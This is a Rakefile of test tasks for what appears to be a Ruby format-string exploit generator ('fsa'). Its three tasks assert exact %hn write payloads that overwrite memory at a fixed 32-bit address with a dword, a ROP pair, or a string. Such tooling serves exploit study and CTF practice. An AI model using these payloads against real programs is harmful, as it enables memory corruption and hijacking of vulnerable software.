#coding: ascii-8bit
require "bundler/gem_tasks"
task :default => :spec

require './lib/fsa.rb'

task :dword do
  fsa = FSA.new
  fsa[0x08049580] = 0xdeadbeef
  raise "Failed: Overwrite dword" if "%48879c%6$hn%8126c%7$hnA\x80\x95\x04\b\x82\x95\x04\b" != fsa.payload(0)
end

task :rop do
  fsa = FSA.new
  fsa[0x08049580] = [0xdeadbeef, 0xdeadbeef]
  raise "Failed: Overwrite ROP" if "%48879c%9$hn%10$hn%8126c%11$hn%12$hn\x80\x95\x04\b\x84\x95\x04\b\x82\x95\x04\b\x86\x95\x04\b" != fsa.payload(0)
end

task :string do
  fsa = FSA.new
  fsa[0x08049580] = "H@CK"
  raise "Failed: Overwrite string" if "%16456c%6$hn%2811c%7$hnA\x80\x95\x04\b\x82\x95\x04\b" != fsa.payload(0)
end
